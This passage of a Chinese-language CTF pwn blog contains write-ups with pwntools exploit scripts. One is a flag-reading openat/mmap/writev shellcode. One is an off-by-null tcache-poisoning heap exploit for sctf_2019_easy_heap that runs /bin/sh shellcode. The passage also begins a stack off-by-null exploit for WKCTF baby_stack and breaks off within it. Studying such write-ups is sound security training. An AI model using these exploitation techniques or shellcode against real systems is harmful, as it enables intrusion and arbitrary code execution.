    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>code_len <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> indices<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        original<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> original<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> original<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> original<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    code_len<span class="token operator">=</span>libc<span class="token punctuation">.</span>strlen<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"lenis:"</span><span class="token punctuation">,</span>code_len<span class="token punctuation">)</span>
    original<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>
    srand<span class="token punctuation">(</span>SEED<span class="token punctuation">)</span>
    <span class="token comment"># 创建一个数组记录索引交换历史</span>
    indices <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>code_len<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># 记录每次的随机索引</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>code_len <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> code_len
        indices<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j

    <span class="token comment"># 逆向重排</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>code_len <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> indices<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        original<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> original<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> original<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> original<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">return</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span>original<span class="token punctuation">)</span>
addr<span class="token operator">=</span><span class="token number">0x1337000</span>
<span class="token comment"># payload=b'\x00\x90'</span>
payload<span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
mov rax, 0x0
'''</span><span class="token punctuation">)</span>

payload<span class="token operator">+=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''

mov rsi, 0x1337088
xor rdi, rdi
sub rdi, 100
xor edx, edx
xor r10, r10
mov rax, 0x101
syscall


mov rdi,0x1437000
mov rsi,0x1000
mov rdx,1
mov rcx,1
mov r8,rax
mov r9,0
mov r10,1
mov rax,9
syscall
             
mov rdi, 1
mov rsi,0x1437000
mov rdi,1
mov rdx,1
mov rsi, 0x1337090
mov rax, SYS_writev
syscall
nop
nop
nop
'''</span><span class="token punctuation">)</span>
payload<span class="token operator">+=</span><span class="token string">b'./flag\x00\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x1437000</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span>
<span class="token comment"># payload = reverse_shuffle(payload)</span>
<span class="token comment"># debug('b *$rebase(0x01715)')</span>
sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'entrance.'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
a<span class="token operator">=</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
a<span class="token operator">=</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token comment"># pause()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 这里记录一下这三个系统调用的参数情况：</p>
<p>openat：int *openat(int dirfd, constchar <em>pathname, int flags, … /</em> mode_t mode */); </p>
<p>第一个参数fd，指向一个目录，设置为特殊值 AT_FDCWD（也就是-100）时代表当前目录，第二个参数为存储着flag文件名的地址，后两个参数和open一样，都为0即可</p>
<p><img src="/images/v2-f96747fdfb10b4653f9b06a0e669d48a_720w.png" alt="img"></p>
<p>mmap：mmap 函数是一个系统调用，用于将文件或设备中的内容映射到进程的地址空间中：</p>
<p>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); </p>
<ul>
<li>addr为第一个参数为要映射区域的起始地址，通常设置为 NULL，让内核选择一个合适的地址。也可以自己选择，但要注意，设置的必须被0x1000整除，</li>
<li>len为第二个参数，要映射的字节数。要被0x1000整除</li>
<li>prot为第三个参数，指定内存映射区域的访问权限，有：PROT_READ：内存可读(0x1)，PROT_WRITE：内存可写(0x2)，PROT_EXEC：内存可执行(0x4)，PROT_NONE：内存不可访问(0x0)，如果想要多个权限，比如可读可写，就可以0x1 and 0x2=0x3，所以如果这个参数是3的话就代表可读可写。</li>
<li>flag为第三个参数，用于指定映射对象的类型、映射选项以及映射区域的特性。常用的为MAP_SHARED(0x1)，代表共享映射，允许多个进程共享映射区域的更改。别的不多列举</li>
<li>offset为第四个参数，用于指定文件映射的起始位置，0就是从开头，多少offset就从多少开始映射但需要被0x1000整除</li>
</ul>
<p><img src="https://picx.zhimg.com/80/v2-b0125b646173b3d0b94871ff5436b723_720w.png?source=d16d100b" alt="img"></p>
<p><img src="/images/v2-ef0734bcc314d6b1b811c6f29087368e_720w.png" alt="img"></p>
<p>writev：ssize_twritev(int fd, conststruct iovec *iov, int iovcnt);</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">iovec</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">void</span>  <span class="token operator">*</span>iov_base<span class="token punctuation">;</span>    <span class="token comment">// 指向数据缓冲区的指针</span>
    <span class="token class-name">size_t</span> iov_len<span class="token punctuation">;</span>     <span class="token comment">// 缓冲区的长度</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>第一个参数fd为文件描述符，指示数据要写入的目标文件、设备或套接字。第二个参数iovec是一个结构体指针，结构体包含指向数据的指针和数据的长度，第三个参数是结构体的数量，有多少个结构体</p>
<p>比如我们想要通过writev来输出存储在0x100000位置上0x100长的数据的话，要先构造好结构体，比如我们的payload存在存放在一个位置base，那么payload=p64(0x100000)+p64(0x100) ,再构造writev(1,base,1)就可以输出了 </p>
<p><img src="https://picx.zhimg.com/80/v2-7f3db859534244d132a18829577df84e_720w.png?source=d16d100b" alt="img"></p>
<h2 id="18-BUU-sctf-2019-easy-heap-off-by-none，不泄露libc"><a href="#18-BUU-sctf-2019-easy-heap-off-by-none，不泄露libc" class="headerlink" title="18.BUU sctf_2019_easy_heap(off by none，不泄露libc)"></a>18.BUU sctf_2019_easy_heap(off by none，不泄露libc)</h2><p>感觉写的wp有些太冗长了，需要精简一些，一道菜单题，没有show，64位2.27保护全开。</p>
<p><img src="/images/v2-10aeea6f9ee79d471de96cc2430a8c16_720w.png" alt="img"></p>
<p>在get_mmap函数中mmap了一顿内存，并通过打印给出了其地址</p>
<p><img src="/images/v2-18b587aa1c5168af5e39bbddc17ba3b0_720w.png" alt="img"></p>
<p>在add和edit中，使用了自己写的read，存在off_by_none漏洞，通过edit可以编辑内容，delete正常</p>
<p><img src="/images/v2-796bd71c235ea2f9ef30a658696727f6_720w.png" alt="img"></p>
<p><img src="https://picx.zhimg.com/80/v2-69cf474aea88aff165b86d12c4d6f9ad_720w.png?source=d16d100b" alt="img"></p>
<p><img src="/images/v2-9a5ae4244d36c8988b8991c10043be39_720w.png" alt="img"></p>
<p>考虑解题方法，只有一个offbynone的漏洞，且没有show函数，我们无法泄露libc地址，而这道题目给出了一个可以获得的mmap地址，我们考虑在mmap段写shellcode来getshell，如何将shellcode写入mmap地址并执行呢，首先是如何写入，利用offbynone漏洞，让一个tcachebin大小的chunk进入tcache，并对其fd指针进行修改，使其指向mmap位置，通过malloc取出，我们就可以在其中写shellcode了。第二是如何执行这一段shellcode，我们知道，进入unsortbin的chunk，其会指向一个libc地址，**(main_arena+96)，**这个地址距离malloc的地址很近，偏移位0x70，所以我们可以再通过offbynone使用一个tcache大小的chunk，通过切割unsortbin的方式，让其中保留有这个(main_arena+96)地址，并释放到tcache中取，再通过edit将其修改为malloc的地址，取出，修改malloc地址指向mmap，这样我们调用mmap就可以执行shellcode了。</p>
<p>看一下关键步骤：我们构造了一个利用offbynone的chunk结构，但和平时不一样的是在两个大chunk中间是两个小chunk而不是一个，因为我们这里写shellcode和改malloc分别要用到一个，构造好，将chunk3给delete，完成offbynone，再让chunk1,2进入tcache，与此同时，所有chunk被合并并进入unsortbin中，并指向(main_arena+96)</p>
<p><img src="/images/v2-a83e9e086045ce5d356b844a5cf22260_720w.png" alt="img"></p>
<p><img src="/images/v2-165beedbf0aa03743715bd29498fd9f9_720w.png" alt="img"></p>
<p>接下来切割unsortbin，add一个大小为0x450的chunk（刚好包含了chunk0和chunk1），这样chunk2的fd指针就会指向了(main_arena+96)，再对这个大小为0x450的chunk进行edit，将chunk1的fd指针修改为mmap地址，这样我们就可以实现取出mmap地址并写入shellcode，接下来就是修改malloc，我们再add一个大小为0x530的chunk，刚好清空了tcache，且chunk2中依然会存有(main_arena+96)的值，这样再修改其为malloc值，就可以了：</p>
<p><img src="/images/v2-e766a7d1c62c3347c3c67a7be97b1b96_720w.png" alt="img"></p>
<p><img src="/images/v2-d5d3151f3740554c6889f6ea94988993_720w.png" alt="img"></p>
<p>接下来就是分别取出，并进行修改就好了，给出exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27641</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

choice_words <span class="token operator">=</span> <span class="token string">'>> '</span>

menu_add <span class="token operator">=</span> <span class="token number">1</span>
add_index_words <span class="token operator">=</span> <span class="token string">''</span>
add_size_words <span class="token operator">=</span> <span class="token string">'Size: '</span>
add_content_words <span class="token operator">=</span> <span class="token string">''</span>

menu_del <span class="token operator">=</span> <span class="token number">2</span>
del_index_words <span class="token operator">=</span> <span class="token string">'Index: '</span>

menu_show <span class="token operator">=</span> <span class="token number">33</span>
show_index_words <span class="token operator">=</span> <span class="token string">'Idx: '</span>

menu_edit <span class="token operator">=</span> <span class="token number">3</span>
edit_index_words <span class="token operator">=</span> <span class="token string">'Index: '</span>
edit_size_words <span class="token operator">=</span> <span class="token string">''</span>
edit_content_words <span class="token operator">=</span> <span class="token string">'Content: '</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_add<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>add_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> add_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>add_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_del<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> del_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>del_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_show<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> show_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>show_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> content<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>choice_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>menu_edit<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_index_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_index_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_size_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>edit_size_words<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> edit_content_words<span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>edit_content_words<span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>


debug<span class="token punctuation">(</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Mmap: '</span><span class="token punctuation">)</span>
mmap_addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'mmap'</span><span class="token punctuation">,</span>mmap_addr<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x420</span><span class="token punctuation">)</span><span class="token comment">#0</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x28</span><span class="token punctuation">)</span><span class="token comment">#1</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token comment">#2</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x4f0</span><span class="token punctuation">)</span><span class="token comment">#3</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token comment">#4</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x30</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4a0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token comment">#offbynone</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>


add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x450</span><span class="token punctuation">)</span><span class="token comment">#切割unsortbin,此时chunk2中存储着main_arena+96#0</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x430</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>mmap_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\n'</span><span class="token punctuation">)</span><span class="token comment">#chunk1的fd指向mmap地址</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x530</span><span class="token punctuation">)</span><span class="token comment">#清空unsortbin，此时可以控制chunk2中的值，且依然存储着main_arena+96#1</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token string">b'\x30\n'</span><span class="token punctuation">)</span>
pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#2</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token comment">#3 mmap从tcache中取出</span>
shellcode<span class="token operator">=</span>asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''
mov rax,0x68732f6e69622f              
push rax
mov rdi, rsp
xor rsi,rsi
xor rdx,rdx
mov rax,59
syscall              
'''</span><span class="token punctuation">)</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>content<span class="token operator">=</span>shellcode<span class="token operator">+</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment">#5</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token comment">#6 malloc从tcache中取出，指向mmap</span>
edit<span class="token punctuation">(</span>index<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>content<span class="token operator">=</span>p64<span class="token punctuation">(</span>mmap_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>
leak_info<span class="token punctuation">(</span><span class="token string">'mmap'</span><span class="token punctuation">,</span>mmap_addr<span class="token punctuation">)</span>
add<span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">0x10</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有一个问题，再清空tcache的时候，chunk2会保存(main_arena+96)的值，但如果add的chunk大小（比如0x500）不是清空tcache，chunk2中依然会留存一个libc地址，但并不是(main_arena+96)，而是(main_arena+1184)这是为什么呢，后面又试了一下，直接add(0x30)，就直接把一个0x40的chunk从tcaceh中取出了，也是可以的，剩下一个还是(main_arena+96)，还可以少malloc一次了后面：</p>
<p><img src="/images/v2-80938edc338c0b7921c6465e05569306_720w.png" alt="img"></p>
<h2 id="19-WKCTF-baby-stack-栈上off-by-none"><a href="#19-WKCTF-baby-stack-栈上off-by-none" class="headerlink" title="19.WKCTF baby_stack(栈上off by none)"></a>19.WKCTF baby_stack(栈上off by none)</h2><p>一道简单的栈上off by none，最开始想成了格式化字符串，导致多做了很久，只看关键的地方，这里会给我们一个格式化字符串的输出，以%x的形式，可以泄露栈上地址，就是因为这里的格式化字符串，所以一直在考虑格式化字符串漏洞，完全没注意后面的漏洞，该反思一下为啥这么简单都没想到。</p>
<p><img src="/images/v2-88943ad034be139fc19d98e5bbc782b5_720w.png" alt="img"></p>
<p>漏洞点，通过fread向content数组输入，并在输入完成后将后一个数组位置写0，这就导致了offbynone，利用这里来做</p>
<p><img src="/images/v2-f83e973a7fad85175059c15928dd4841_720w.png" alt="img"></p>
<p>我们首先通过给的格式化字符串泄露一个libc地址，获得libc基地址，接下来看offbynone这里，输入8个a，可以看到，我们的输入会因为offbynone把栈上的一个地址改为00，而rbp的链刚好是我们能够off by none改到的地方，我们将输入填满到0x7fff8fbfab18，这样就会让rbp链的0x7fff8fbfab50变成0x7fff8fbfab00，在我们的输入范围内，将哪里改为one_gadget就好了，这样经过几次leave ret，我们就可以执行one_gadgets了。</p>
<p><img src="/images/v2-eb2e4805a009bc27140b0ee88947dd59_720w.png" alt="img"></p>
<p><img src="/images/v2-0d3645daeca95d58cc19bc6fc79e952f_720w.png" alt="img"></p>
<p>给出exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment">#from ae64 import AE64</span>
<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> cdll

filename <span class="token operator">=</span> <span class="token string">'./pwn'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'neww'</span><span class="token punctuation">]</span>
local <span class="token operator">=</span> <span class="token number">1</span>
all_logs <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span>filename<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>parma<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> an_log <span class="token keyword">in</span> all_logs<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>an_log<span class="token punctuation">)</span>
    pid <span class="token operator">=</span> util<span class="token punctuation">.</span>proc<span class="token punctuation">.</span>pidof<span class="token punctuation">(</span>sh<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>pid<span class="token punctuation">,</span>parma<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">leak_info</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    output_log <span class="token operator">=</span> <span class="token string">'&#123;&#125; => &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    all_logs<span class="token punctuation">.</span>append<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>
    success<span class="token punctuation">(</span>output_log<span class="token punctuation">)</span>

